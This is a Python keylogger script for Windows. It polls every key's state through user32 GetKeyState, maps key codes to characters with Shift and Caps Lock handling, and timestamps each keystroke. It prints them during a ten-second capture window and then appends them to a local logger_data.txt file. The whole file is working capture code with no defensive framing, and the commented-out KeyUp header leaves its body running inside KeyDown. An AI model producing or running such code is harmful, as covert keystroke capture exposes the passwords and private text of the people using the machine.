# cd C:\Users\bjindal\Downloads

import threading, time
from ctypes import *

class Thread():
    def __init__(self, addressOf, args):
        self.terminate = False
        self.Instance = threading.Thread(target=addressOf, args=args)
        self.Instance.daemon = True
        self.Instance.start()

VKStr = {}
VKStr[0x01] = "LEFT_MOUSEE"
VKStr[0x02] = "RIGHT_MOUSE"
VKStr[0x03] = "MIDDLE_MOUSE"
VKStr[0x08] = "BACKSPACE"
VKStr[0x09] = "TAB"
VKStr[0x0D] = "ENTER"
VKStr[0x10] = "SHIFT"
VKStr[0x11] = "CTRL"
VKStr[0x12] = "ALT"
VKStr[0x14] = "CAPSLOCK"
VKStr[0x18] = "ESCAPE"
VKStr[0x20] = ""
VKStr[0x25] = "LEFT_ARROW"
VKStr[0x26] = "UP_ARROW"
VKStr[0x27] = "RIGHT_ARROW"
VKStr[0x28] = "DOWN_ARROW"
VKStr[0x2C] = "PRINT_SCREEN"
VKStr[0x30] = "0"
VKStr[0x31] = "1"
VKStr[0x32] = "2"
VKStr[0x33] = "3"
VKStr[0x34] = "4"
VKStr[0x35] = "5"
VKStr[0x36] = "6"
VKStr[0x37] = "7"
VKStr[0x38] = "8"
VKStr[0x39] = "9"
VKStr[0x41] = "a"
VKStr[0x42] = "b"
VKStr[0x43] = "c"
VKStr[0x44] = "d"
VKStr[0x45] = "e"
VKStr[0x46] = "f"
VKStr[0x47] = "g"
VKStr[0x48] = "h"
VKStr[0x49] = "i"
VKStr[0x4A] = "j"
VKStr[0x4B] = "k"
VKStr[0x4C] = "l"
VKStr[0x4D] = "m"
VKStr[0x4E] = "n"
VKStr[0x4F] = "o"
VKStr[0x50] = "p"
VKStr[0x51] = "q"
VKStr[0x52] = "r"
VKStr[0x53] = "s"
VKStr[0x54] = "t"
VKStr[0x55] = "u"
VKStr[0x56] = "v"
VKStr[0x57] = "w"
VKStr[0x58] = "x"
VKStr[0x59] = "y"
VKStr[0x5A] = "z"
VKStr[0x5B] = "Left Windows"
VKStr[0x5C] = "Right Windows"
VKStr[0x5D] = "Applications"
VKStr[0x5F] = "Computer Sleep"
VKStr[0x60] = "Num 0"
VKStr[0x61] = "Num 1"
VKStr[0x62] = "Num 2"
VKStr[0x63] = "Num 3"
VKStr[0x64] = "Num 4"
VKStr[0x65] = "Num 5"
VKStr[0x66] = "Num 6"
VKStr[0x67] = "Num 7"
VKStr[0x68] = "Num 8"
VKStr[0x69] = "Num 9"
VKStr[0x6A] = "Multiply"
VKStr[0x6B] = "Add"
VKStr[0x6C] = "Separator"
VKStr[0x6D] = "Subtract"
VKStr[0x6E] = "Decimal"
VKStr[0x6F] = "Divide"
VKStr[0x70] = "F1"
VKStr[0x71] = "F2"
VKStr[0x72] = "F3"
VKStr[0x73] = "F4"
VKStr[0x74] = "F5"
VKStr[0x75] = "F6"
VKStr[0x76] = "F7"
VKStr[0x77] = "F8"
VKStr[0x78] = "F9"
VKStr[0x79] = "F10"
VKStr[0x7A] = "F11"
VKStr[0x7B] = "F12"
VKStr[0x7C] = "F13"
VKStr[0x7D] = "F14"
VKStr[0x7E] = "F15"
VKStr[0x7F] = "F16"
VKStr[0x80] = "F17"
VKStr[0x81] = "F18"
VKStr[0x82] = "F19"
VKStr[0x83] = "F20"
VKStr[0x84] = "F21"
VKStr[0x85] = "F22"
VKStr[0x86] = "F23"
VKStr[0x87] = "F24"
VKStr[0x90] = "NUM LOCK"
VKStr[0x91] = "SCROLL LOCK"
# VKStr[0xA0] = "Left SHIFT"
# VKStr[0xA1] = "Right SHIFT"
VKStr[0xA2] = "Left CONTROL"
VKStr[0xA3] = "Right CONTROL"
VKStr[0xA4] = "Left ALT"
VKStr[0xA5] = "Right ALT"
VKStr[0xA6] = "Browser Back"
VKStr[0xA7] = "Browser Forward"
VKStr[0xA8] = "Browser Refresh"
VKStr[0xA9] = "Browser Stop"
VKStr[0xAA] = "Browser Search"
VKStr[0xAB] = "Browser Favorites"
VKStr[0xAC] = "Browser Start and Home"
VKStr[0xAD] = "Volume Mute"
VKStr[0xAE] = "Volume Down"
VKStr[0xAF] = "Volume Up"
VKStr[0xB0] = "Next Track"
VKStr[0xB1] = "Previous Track"
VKStr[0xB2] = "Stop Media"
VKStr[0xB3] = "Play/Pause Media"
VKStr[0xB4] = "Start Mail"
VKStr[0xB5] = "Select Media"
VKStr[0xB6] = "Start Application 1"
VKStr[0xB7] = "Start Application 2"
VKStr[0xBA] = ";"
VKStr[0xBB] = "+"
VKStr[0xBC] = ","
VKStr[0xBD] = "-"
VKStr[0xBE] = "."
VKStr[0xBF] = "/?"
VKStr[0xC0] = "~"
VKStr[0xDB] = "["
VKStr[0xDC] = "\\"
VKStr[0xDD] = "]"
VKStr[0xDE] = "Single-Quote"
VKStr[0xDF] = "Used for Miscellaneous Characters; Can Vary by Keyboard"
VKStr[0xE5] = "IME PROCESS"
VKStr[0xE7] = "Used to Pass Unicode Characters as Keystrokes"
VKStr[0xF6] = "Attn"
VKStr[0xF7] = "CrSel"
VKStr[0xF8] = "ExSel"
VKStr[0xF9] = "Erase EOF"
VKStr[0xFA] = "Play"
VKStr[0xFB] = "Zoom"
VKStr[0xFD] = "PA1"
VKStr[0xFE] = "Clear"


ShiftEquivs={}
ShiftEquivs[0x30] = ")"
ShiftEquivs[0x31] = "!"
ShiftEquivs[0x32] = "\""
ShiftEquivs[0x33] = "£"
ShiftEquivs[0x34] = "$"
ShiftEquivs[0x35] = "%"
ShiftEquivs[0x36] = "^"
ShiftEquivs[0x37] = "&"
ShiftEquivs[0x38] = "*"
ShiftEquivs[0x39] = "("

VKStr[0xBA] = ":"
ShiftEquivs[0xBF] = "?"
ShiftEquivs[0xDB] = "{"
ShiftEquivs[0xDC] = "|"
ShiftEquivs[0xDD] = "}"
ShiftEquivs[0xDE] = "Double-Quote"


ActiveKeys = {}

def StringToVK(string):
    for key, value in VKStr.items():
        if value == string:
            return key

def VKToString(VK):
    return VKStr[VK]

def IsKeyPressed(VK_KEYCODE):
    if type(VK_KEYCODE) == str:
        try:
            VK_KEYCODE = StringToVK(VK_KEYCODE)
        except:
            raise Exception("Exception caught in sub: 'IsKeyPressed' arg VK_KEYCODE is invalid")
            return

    return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x8000 != 0

def IsKeyToggled(VK_KEYCODE):
    return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x0001 != 0

class KeyTracker:
    def __init__(self):
        self.tracking = False
        self.tracked_string_concat = "" + " " + str(time.time()) + "\n\n\n"
        self.file_open = False

    def StartTracking(self):
        self.tracking = True

    def StopTracking(self):
        self.tracking = False
        self.CompileData()

    def KeyDown(self, key):
        str_old = self.tracked_string_concat
        if self.tracking and VKToString(key) != "SHIFT":
            if IsKeyToggled(StringToVK("CAPSLOCK")):
                self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper() + " " + str(time.time()) + "\n\n\n"
            elif IsKeyPressed(StringToVK("SHIFT")):
                shiftEquiv = False
                try:
                    ShiftEquivs[key]
                    shiftEquiv = True
                except:
                    pass

                if shiftEquiv:
                    self.tracked_string_concat = self.tracked_string_concat + ShiftEquivs[key] + " " + str(time.time()) + "\n\n\n"
                else:
                    self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper() + " "  + str(time.time()) + "\n\n\n"
            else:
                self.tracked_string_concat = self.tracked_string_concat + VKToString(key) + " " + str(time.time()) + "\n\n\n"
            print(self.tracked_string_concat.replace(str_old, ""))

    # def KeyUp(self, key):
        str_old = self.tracked_string_concat
        if self.tracking and VKToString(key) == "SHIFT":
            self.tracked_string_concat = self.tracked_string_concat + VKToString(key) + " " + str(time.time()) + "\n\n\n"
            print(self.tracked_string_concat.replace(str_old, ""))
            pass

    def UpdateKeyState(self, key, state):  
        def SetKeyState(key, state):
            ActiveKeys[key] = state
            if state == True:
                self.KeyDown(key)
            # elif state == False:
            #     self.KeyUp(key)

        keyExists = False
        try:
            ActiveKeys[key]
            keyExists = True
        except:
            pass

        if keyExists:
            if ActiveKeys[key] != state:
                SetKeyState(key, state)
        else:
            SetKeyState(key, state)

    def CompileData(self):
        try:
            file = open("logger_data.txt", "a")
            file.write("\n")
            file.write("-"*15)
            file.write("\n")
            file.write(self.tracked_string_concat)
            file.close()
        except:
            pass

    def TrackData(self, time_length): #timeLength in seconds
        KeyTracker.StartTracking()
        time.sleep(time_length)
        KeyTracker.StopTracking()

KeyTracker = KeyTracker()
t = Thread(KeyTracker.TrackData, [10])
while True:
    for key, key_name in VKStr.items():
        KeyTracker.UpdateKeyState(key, IsKeyPressed(key))